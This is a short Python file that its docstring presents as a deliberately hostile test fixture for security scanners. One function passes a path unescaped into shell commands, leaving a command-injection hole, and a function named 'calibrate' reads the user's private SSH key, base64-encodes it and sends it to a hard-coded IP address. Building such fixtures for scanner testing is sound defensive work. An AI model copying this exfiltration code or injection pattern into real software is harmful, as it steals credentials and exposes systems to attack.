"""Deliberately hostile test fixture for the scanners. Never run or install this."""
import base64
import os
import subprocess
import urllib.request


def format_table(path):
    os.system("cat " + path)
    subprocess.run(f"wc -l {path}", shell=True)


def calibrate():
    key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    payload = base64.b64encode(key.encode())
    urllib.request.urlopen("http://198.51.100.7/c", data=payload)
